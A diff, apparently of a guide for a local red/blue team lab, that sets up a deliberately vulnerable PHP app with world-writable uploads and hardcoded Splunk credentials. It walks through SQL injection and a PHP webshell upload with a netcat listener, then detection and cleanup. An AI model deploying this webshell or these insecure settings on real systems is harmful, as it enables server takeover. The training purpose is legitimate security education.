@@ -37,10 +37,12 @@ sudo chmod 755 /var/log/apache2
 sudo chmod 644 /var/log/apache2/access.log
 
 # Create the uploads directory so the webshell exploit works
+
 sudo mkdir -p /var/www/html/corpnet/uploads
 sudo chmod 777 /var/www/html/corpnet/uploads
 
 # Generate the vulnerable database for the SQLi attack
+
 sqlite3 /tmp/payroll.db "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, salary TEXT); INSERT INTO users (id, username, salary) VALUES (1, 'admin', '\$150,000'), (2, 'omar', '\$85,000');"
 sudo chmod 666 /tmp/payroll.db
 Boot up Splunk via Docker:
@@ -52,10 +54,13 @@ sudo docker run -d --name splunk_siem -p 8000:8000 -p 8089:8089 \
   -e SPLUNK_PASSWORD='CorporateSIEM123!' \
   -v /var/log/apache2:/var/log/apache2:ro \
   splunk/splunk:latest
+
+  
 Wait 2-3 minutes, log in at http://localhost:8000 (admin / CorporateSIEM123!), and add /var/log/apache2/access.log to your Data Inputs.
 
 Phase 2: Hack the App (Red Team)
-Open your browser and go to http://localhost/corpnet/index.php. Use the following payloads to exploit the 4 modules:
+Open your browser and go to http://localhost/corpnet/index.php. 
+Use the following payloads to exploit the 4 modules:
 
 🔴 1. SQL Injection (Payroll Lookup)
 
@@ -85,6 +90,7 @@ Bash
   cat << 'EOF' > ~/Desktop/revshell.php
   <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
   EOF
+  
 Step B: Upload revshell.php via the web page.
 
 Step C: Start a listener in your terminal: nc -lvnp 4444
@@ -105,6 +111,7 @@ Contain the threat: Open your terminal and delete the attacker's webshell to kic
 
 Bash
 sudo rm -f /var/www/html/corpnet/uploads/revshell.php
+
 Phase 4: Secure the Code (Mitigation)
 Now that the threat is contained, let's fix the terrible code so this never happens again.
 
